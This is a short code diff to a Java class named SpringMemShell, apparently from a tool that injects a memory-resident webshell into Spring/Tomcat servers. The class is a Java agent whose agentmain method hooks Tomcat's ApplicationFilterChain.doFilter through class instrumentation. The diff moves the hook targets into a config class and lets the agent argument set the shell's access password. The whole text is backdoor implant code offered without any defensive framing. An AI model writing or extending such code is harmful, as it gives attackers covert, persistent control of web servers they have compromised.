@@ -1,19 +1,27 @@
 package com.stdout.springMem;
 
+import com.stdout.Config.DefaultConfig;
+import com.stdout.Transformers.SpringBackTransformer;
+import com.stdout.Transformers.SpringMemTransformer;
+
 import java.io.IOException;
 import java.lang.instrument.ClassFileTransformer;
 import java.lang.instrument.Instrumentation;
 import java.lang.instrument.UnmodifiableClassException;
 
 public class SpringMemShell {
-    public static final String TransformedClassName = "org.apache.catalina.core.ApplicationFilterChain";
-    public static final String TransformedMethodName = "doFilter";
+    public static final String TransformedClassName = DefaultConfig.SpringMemShellConfig.TransformedClassName;
+    public static final String TransformedMethodName = DefaultConfig.SpringMemShellConfig.TransformedMethodName;
+
     public static ClassFileTransformer T = null;
 
     public static Instrumentation i = null;
 
     public static void agentmain(String agentArgs, Instrumentation inst) throws ClassNotFoundException, UnmodifiableClassException, IOException {
         i = inst;
+        if (agentArgs != null) {
+            DefaultConfig.SpringMemShellConfig.MemShellPassword = agentArgs;
+        }
         start();
     }
 
